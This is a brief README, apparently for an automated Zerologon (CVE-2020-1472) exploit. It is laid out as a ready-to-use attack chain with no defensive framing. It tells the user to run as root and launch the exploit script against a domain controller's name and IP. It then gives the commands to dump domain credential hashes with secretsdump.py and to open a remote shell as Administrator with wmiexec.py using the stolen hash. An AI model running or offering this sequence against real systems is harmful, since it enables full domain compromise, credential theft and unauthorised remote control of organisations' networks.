# zerologon automated 
run this script as a root user 

sudo su 

After installation is completed then run the python script as following 

python3 cve-2020-1472-exploit.py -n computername -t target ip

  secretsdump.py -no-pass -just-dc domain/computername\$@targetip

  wmiexec.py -hashes hashdump of administrator domain/Administrator@targetip

